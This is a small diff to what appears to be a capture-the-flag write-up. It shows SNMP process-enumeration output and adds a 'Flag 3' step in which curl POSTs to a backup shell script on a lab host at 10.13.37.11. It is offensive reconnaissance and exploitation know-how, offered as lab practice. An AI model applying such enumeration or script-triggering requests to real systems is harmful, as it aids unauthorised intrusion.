@@ -62,3 +62,8 @@ iso.3.6.1.2.1.25.4.2.1.5.1241 = STRING: "/var/www/html/dev/space_dev.py"
 iso.3.6.1.2.1.25.4.2.1.5.1243 = STRING: "--socket-activation"
 [...SNIP...]
 ```
+
+## Flag 3 Dead Poet
+```bash
+curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
+```
